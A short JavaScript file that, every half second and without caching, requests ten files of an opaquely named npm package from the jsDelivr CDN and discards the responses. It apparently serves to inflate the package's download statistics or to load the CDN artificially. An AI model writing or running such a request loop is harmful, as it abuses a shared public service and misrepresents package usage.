'use-strict';

(() => {
    const urls = [
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground.min.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground/withCache.min.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground/withCache.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground/withoutCache.min.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground/withoutCache.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/experiment.min.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/experiment.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground/general.min.js',
        'https://cdn.jsdelivr.net/npm/32ae08ef@0.0.11/loadBackground/general.js'];
    setInterval(() => { for (const url of urls) { fetch(url, { cache: 'no-store' }); } }, 500);
})();